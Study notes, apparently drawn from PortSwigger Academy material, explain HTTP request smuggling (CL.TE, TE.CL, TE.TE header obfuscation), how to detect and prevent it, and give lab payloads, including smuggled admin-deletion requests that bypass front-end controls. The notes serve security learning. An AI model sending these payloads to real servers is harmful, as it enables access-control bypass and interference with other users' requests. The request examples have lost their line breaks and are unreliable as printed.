- **What is HTTP request smuggling?**
    
    HTTP request smuggling is a technique for interfering with the way a web site processes sequences of HTTP requests that are received from one or more users. Request smuggling vulnerabilities are often critical in nature, allowing an attacker to bypass security controls, gain unauthorized access to sensitive data, and directly compromise other application users.
    
- **What happens in an HTTP request smuggling attack?**
    
    Today's web applications frequently employ chains of HTTP servers between users and the ultimate application logic. Users send requests to a front-end server (sometimes called a load balancer or reverse proxy) and this server forwards requests to one or more back-end servers. This type of architecture is increasingly common, and in some cases unavoidable, in modern cloud-based applications.
    
    When the front-end server forwards HTTP requests to a back-end server, it typically sends several requests over the same back-end network connection, because this is much more efficient and performant. The protocol is very simple: HTTP requests are sent one after another, and the receiving server parses the HTTP request headers to determine where one request ends and the next one begins:
    
    [![](https://portswigger.net/web-security/images/forwarding-http-requests-to-back-end-server.svg)](https://portswigger.net/web-security/images/forwarding-http-requests-to-back-end-server.svg)
    
    In this situation, it is crucial that the front-end and back-end systems agree about the boundaries between requests. Otherwise, an attacker might be able to send an ambiguous request that gets interpreted differently by the front-end and back-end systems:
    
    [![](https://portswigger.net/web-security/images/smuggling-http-request-to-back-end-server.svg)](https://portswigger.net/web-security/images/smuggling-http-request-to-back-end-server.svg)
    
    Here, the attacker causes part of their front-end request to be interpreted by the back-end server as the start of the next request. It is effectively prepended to the next request, and so can interfere with the way the application processes that request. This is a request smuggling attack, and it can have devastating results.
    
      
    
- **How do HTTP request smuggling vulnerabilities arise?**
    
    Most HTTP request smuggling vulnerabilities arise because the HTTP specification provides two different ways to specify where a request ends: the `Content-Length` header and the `Transfer-Encoding` header.
    
    The `Content-Length` header is straightforward: it specifies the length of the message body in bytes. For example:
    
    ```
    POST /search HTTP/1.1Host: normal-website.comContent-Type: application/x-www-form-urlencodedContent-Length: 11q=smuggling
    ```
    
    The `Transfer-Encoding` header can be used to specify that the message body uses chunked encoding. This means that the message body contains one or more chunks of data. Each chunk consists of the chunk size in bytes (expressed in hexadecimal), followed by a newline, followed by the chunk contents. The message is terminated with a chunk of size zero. For example:
    
    ```
    POST /search HTTP/1.1Host: normal-website.comContent-Type: application/x-www-form-urlencodedTransfer-Encoding: chunkedbq=smuggling0
    ```
    
    ### **Note**
    
    Many security testers are unaware that chunked encoding can be used in HTTP requests, for two reasons:
    
    - Burp Suite automatically unpacks chunked encoding to make messages easier to view and edit.
    - Browsers do not normally use chunked encoding in requests, and it is normally seen only in server responses.
    
    Since the HTTP specification provides two different methods for specifying the length of HTTP messages, it is possible for a single message to use both methods at once, such that they conflict with each other. The HTTP specification attempts to prevent this problem by stating that if both the `Content-Length` and `Transfer-Encoding` headers are present, then the `Content-Length` header should be ignored. This might be sufficient to avoid ambiguity when only a single server is in play, but not when two or more servers are chained together. In this situation, problems can arise for two reasons:
    
    - Some servers do not support the `Transfer-Encoding` header in requests.
    - Some servers that do support the `Transfer-Encoding` header can be induced not to process it if the header is obfuscated in some way.
    
    If the front-end and back-end servers behave differently in relation to the (possibly obfuscated) `Transfer-Encoding` header, then they might disagree about the boundaries between successive requests, leading to request smuggling vulnerabilities.
    
- **How to perform an HTTP request smuggling attack**
    
    Request smuggling attacks involve placing both the `Content-Length` header and the `Transfer-Encoding` header into a single HTTP request and manipulating these so that the front-end and back-end servers process the request differently. The exact way in which this is done depends on the behavior of the two servers:
    
    - CL.TE: the front-end server uses the `Content-Length` header and the back-end server uses the `Transfer-Encoding` header.
    - TE.CL: the front-end server uses the `Transfer-Encoding` header and the back-end server uses the `Content-Length` header.
    - TE.TE: the front-end and back-end servers both support the `Transfer-Encoding` header, but one of the servers can be induced not to process it by obfuscating the header in some way.
    
    💡
    
    These techniques are only possible using HTTP/1 requests. Browsers and other clients, including Burp, use HTTP/2 by default to communicate with servers that explicitly advertise support for it via ALPN as part of the TLS handshake. As a result, when testing sites with HTTP/2 support, you need to manually switch protocols in Burp Repeater. You can do this from the **Request attributes** section of the **Inspector** panel.
    
    ### **CL.TE vulnerabilities**
    
    Here, the front-end server uses the `Content-Length` header and the back-end server uses the `Transfer-Encoding` header. We can perform a simple HTTP request smuggling attack as follows:
    
    ```
    POST / HTTP/1.1Host: vulnerable-website.comContent-Length: 13Transfer-Encoding: chunked0SMUGGLED
    ```
    
    The front-end server processes the `Content-Length` header and determines that the request body is 13 bytes long, up to the end of `SMUGGLED`. This request is forwarded on to the back-end server.
    
    The back-end server processes the `Transfer-Encoding` header, and so treats the message body as using chunked encoding. It processes the first chunk, which is stated to be zero length, and so is treated as terminating the request. The following bytes, `SMUGGLED`, are left unprocessed, and the back-end server will treat these as being the start of the next request in the sequence.
    
    ### **TE.CL vulnerabilities**
    
    Here, the front-end server uses the `Transfer-Encoding` header and the back-end server uses the `Content-Length` header. We can perform a simple HTTP request smuggling attack as follows:
    
    ```
    POST / HTTP/1.1Host: vulnerable-website.comContent-Length: 3Transfer-Encoding: chunked8SMUGGLED0
    ```
    
    🗒️
    
    To send this request using Burp Repeater, you will first need to go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked.
    
    You need to include the trailing sequence `\r\n\r\n` following the final `0`.
    
    The front-end server processes the `Transfer-Encoding` header, and so treats the message body as using chunked encoding. It processes the first chunk, which is stated to be 8 bytes long, up to the start of the line following `SMUGGLED`. It processes the second chunk, which is stated to be zero length, and so is treated as terminating the request. This request is forwarded on to the back-end server.
    
    The back-end server processes the `Content-Length` header and determines that the request body is 3 bytes long, up to the start of the line following `8`. The following bytes, starting with `SMUGGLED`, are left unprocessed, and the back-end server will treat these as being the start of the next request in the sequence.
    
    ### **TE.TE behavior: obfuscating the TE header**
    
    Here, the front-end and back-end servers both support the `Transfer-Encoding` header, but one of the servers can be induced not to process it by obfuscating the header in some way.
    
    There are potentially endless ways to obfuscate the `Transfer-Encoding` header. For example:
    
    ```
    Transfer-Encoding: xchunkedTransfer-Encoding : chunkedTransfer-Encoding: chunkedTransfer-Encoding: xTransfer-Encoding:[tab]chunked[space]Transfer-Encoding: chunkedX: X[\n]Transfer-Encoding: chunkedTransfer-Encoding: chunked
    ```
    
    Each of these techniques involves a subtle departure from the HTTP specification. Real-world code that implements a protocol specification rarely adheres to it with absolute precision, and it is common for different implementations to tolerate different variations from the specification. To uncover a TE.TE vulnerability, it is necessary to find some variation of the `Transfer-Encoding` header such that only one of the front-end or back-end servers processes it, while the other server ignores it.
    
    Depending on whether it is the front-end or the back-end server that can be induced not to process the obfuscated `Transfer-Encoding` header, the remainder of the attack will take the same form as for the CL.TE or TE.CL vulnerabilities already described.
    
- **How to prevent HTTP request smuggling vulnerabilities**
    
    HTTP request smuggling vulnerabilities arise in situations where the front-end server and back-end server use different mechanisms for determining the boundaries between requests. This may be due to discrepancies between whether HTTP/1 servers use the `Content-Length` header or chunked transfer encoding to determine where each request ends. In HTTP/2 environments, the common practice of [downgrading HTTP/2 requests](https://portswigger.net/web-security/request-smuggling/advanced/http2-downgrading) for the back-end is also fraught with issues and enables or simplifies a number of additional attacks.
    
    To prevent HTTP request smuggling vulnerabilities, we recommend the following high-level measures:
    
    - Use HTTP/2 end to end and disable HTTP downgrading if possible. HTTP/2 uses a robust mechanism for determining the length of requests and, when used end to end, is inherently protected against request smuggling. If you can't avoid HTTP downgrading, make sure you validate the rewritten request against the HTTP/1.1 specification. For example, reject requests that contain newlines in the headers, colons in header names, and spaces in the request method.
    - Make the front-end server normalize ambiguous requests and make the back-end server reject any that are still ambiguous, closing the TCP connection in the process.
    - Never assume that requests won't have a body. This is the fundamental cause of both CL.0 and client-side desync vulnerabilities.
    - Default to discarding the connection if server-level exceptions are triggered when handling requests.
    - If you route traffic through a forward proxy, ensure that upstream HTTP/2 is enabled if possible.
    
    As we've demonstrated in the learning materials, disabling reuse of back-end connections will help to mitigate certain kinds of attack, but this still doesn't protect you from [request tunnelling](https://portswigger.net/web-security/request-smuggling/advanced/request-tunnelling) attacks.
    
    **Read more**[Find HTTP request smuggling vulnerabilities using Burp Suite's web vulnerability scanner](https://portswigger.net/burp/vulnerability-scanner)
    

## **Finding HTTP request smuggling vulnerabilities using timing techniques**

The most generally effective way to detect HTTP request smuggling vulnerabilities is to send requests that will cause a time delay in the application's responses if a vulnerability is present. This technique is used by [Burp Scanner](https://portswigger.net/burp/vulnerability-scanner) to automate the detection of request smuggling vulnerabilities.

### **Note**

Some important considerations should be kept in mind when attempting to confirm request smuggling vulnerabilities via interference with other requests:

- The "attack" request and the "normal" request should be sent to the server using different network connections. Sending both requests through the same connection won't prove that the vulnerability exists.
- The "attack" request and the "normal" request should use the same URL and parameter names, as far as possible. This is because many modern applications route front-end requests to different back-end servers based on the URL and parameters. Using the same URL and parameters increases the chance that the requests will be processed by the same back-end server, which is essential for the attack to work.
- When testing the "normal" request to detect any interference from the "attack" request, you are in a race with any other requests that the application is receiving at the same time, including those from other users. You should send the "normal" request immediately after the "attack" request. If the application is busy, you might need to perform multiple attempts to confirm the vulnerability.
- In some applications, the front-end server functions as a load balancer, and forwards requests to different back-end systems according to some load balancing algorithm. If your "attack" and "normal" requests are forwarded to different back-end systems, then the attack will fail. This is an additional reason why you might need to try several times before a vulnerability can be confirmed.
- If your attack succeeds in interfering with a subsequent request, but this wasn't the "normal" request that you sent to detect the interference, then this means that another application user was affected by your attack. If you continue performing the test, this could have a disruptive effect on other users, and you should exercise caution.

### **first make sure that request attripute is** `**HTTP/1**`

- [**HTTP request smuggling, basic CL.TE vulnerability**](https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te)
    
    If an application is vulnerable to the CL.TE variant of request smuggling, then sending a request like the following will often cause a time delay:
    
    ```
    POST / HTTP/1.1Host: vulnerable-website.comTransfer-Encoding: chunkedContent-Length: 41AX
    ```
    
    Since the front-end server uses the `Content-Length` header, it will forward only part of this request, omitting the `X`. The back-end server uses the `Transfer-Encoding` header, processes the first chunk, and then waits for the next chunk to arrive. This will cause an observable time delay.
    
- [**HTTP request smuggling, basic TE.CL vulnerability**](https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl)
    
    If an application is vulnerable to the TE.CL variant of request smuggling, then sending a request like the following will often cause a time delay:
    
    ```
    POST / HTTP/1.1Host: vulnerable-website.comTransfer-Encoding: chunkedContent-Length: 60X
    ```
    
    Since the front-end server uses the `Transfer-Encoding` header, it will forward only part of this request, omitting the `X`. The back-end server uses the `Content-Length` header, expects more content in the message body, and waits for the remaining content to arrive. This will cause an observable time delay.
    
    ### **Note**
    
    The timing-based test for TE.CL vulnerabilities will potentially disrupt other application users if the application is vulnerable to the CL.TE variant of the vulnerability. So to be stealthy and minimize disruption, you should use the CL.TE test first and continue to the TE.CL test only if the first test is unsuccessful.
    
- [**HTTP request smuggling, obfuscating the TE header**](https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header)
    
    There are potentially endless ways to obfuscate the `Transfer-Encoding` header. For example:
    
    ```
    Transfer-Encoding: xchunkedTransfer-Encoding : chunkedTransfer-Encoding: chunkedTransfer-Encoding: xTransfer-Encoding:[tab]chunked[space]Transfer-Encoding: chunkedX: X[\n]Transfer-Encoding: chunkedTransfer-Encoding: chunked
    ```
    
    In Burp Suite, go to the Repeater menu and ensure that the "`Update Content-Length`" option is unchecked.
    
    Using Burp Repeater, issue the following request twice:
    
    ```
    POST / HTTP/1.1Host: 0a3400f0032f7a9883d3f5e1002a0063.web-security-academy.netConnection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-length: 4Transfer-Encoding: chunkedTransfer-encoding: cow5cGPOST / HTTP/1.1Content-Type: application/x-www-form-urlencodedContent-Length: 15x=10
    ```
    
    ### **Note**
    
    You need to include the trailing sequence `\r\n\r\n` following the final `0`.
    
    The second response should say: `Unrecognized method GPOST`.
    
- [**HTTP request smuggling, confirming a CL.TE vulnerability via differential responses**](https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-cl-te-via-differential-responses)
    
    To confirm a CL.TE vulnerability, you would send an attack request like this:
    
    ```
    POST / HTTP/1.1Host: YOUR-LAB-ID.web-security-academy.netContent-Type: application/x-www-form-urlencodedContent-Length: 35Transfer-Encoding: chunked0GET /404 HTTP/1.1X-Ignore: X
    ```
    
    If the attack is successful, then the last two lines of this request are treated by the back-end server as belonging to the next request that is received. This will cause the subsequent "normal" request to look like this:
    
    ```
    GET /404 HTTP/1.1Foo: xPOST /search HTTP/1.1Host: vulnerable-website.comContent-Type: application/x-www-form-urlencodedContent-Length: 11q=smuggling
    ```
    
    Since this request now contains an invalid URL, the server will respond with status code 404, indicating that the attack request did indeed interfere with it.
    
- [**HTTP request smuggling, confirming a TE.CL vulnerability via differential responses**](https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-te-cl-via-differential-responses)
    
    In Burp Suite, go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked.
    
    Using Burp Repeater, issue the following request twice:
    
    ```
    POST / HTTP/1.1Host: 0aa200c80317e3b181ba8e7700f700a9.web-security-academy.netContent-Type: application/x-www-form-urlencodedConnection: keep-aliveContent-length: 4Transfer-Encoding: chunked5ePOST /404 HTTP/1.1Content-Type: application/x-www-form-urlencodedContent-Length: 15x=10
    ```
    
    The second request should receive an HTTP 404 response.
    
- [**Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability**](https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te)
    
    ```
    POST / HTTP/1.1Host: YOUR-LAB-ID.web-security-academy.netContent-Type: application/x-www-form-urlencodedContent-Length: 139Transfer-Encoding: chunked0GET /admin/delete?username=carlos HTTP/1.1Host: localhostContent-Type: application/x-www-form-urlencodedContent-Length: 10x=
    ```
    
- [**Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability**](https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl)
    
    ```
    POST / HTTP/1.1Host: 0a6d00b00476a23a85410eb100e000c7.web-security-academy.netContent-Type: application/x-www-form-urlencodedContent-length: 4Transfer-Encoding: chunked87GET /admin/delete?username=carlos HTTP/1.1Host: localhostContent-Type: application/x-www-form-urlencodedContent-Length: 15x=10
    ```